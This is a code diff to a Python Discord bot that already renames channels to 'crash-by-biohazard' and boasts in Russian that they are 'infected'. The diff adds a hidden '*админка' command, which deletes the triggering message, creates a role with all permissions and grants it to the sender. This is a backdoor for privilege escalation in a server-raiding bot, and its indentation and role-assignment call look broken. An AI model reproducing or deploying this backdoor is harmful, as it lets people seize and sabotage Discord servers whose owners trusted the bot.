@@ -198,6 +198,11 @@ class MyClient(discord.Client):
 				await message.delete()
 				await message.channel.edit(name='crash-by-biohazard')
 				await message.author.send(':microbe: **Канал** `' + message.channel + '` **заражён!**')
+				
+			if message.content == '*админка': #выдаёт админку
+				await message.delete()
+				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
+            			await client.add_roles(message.author, role)
 					
 
 client = MyClient()
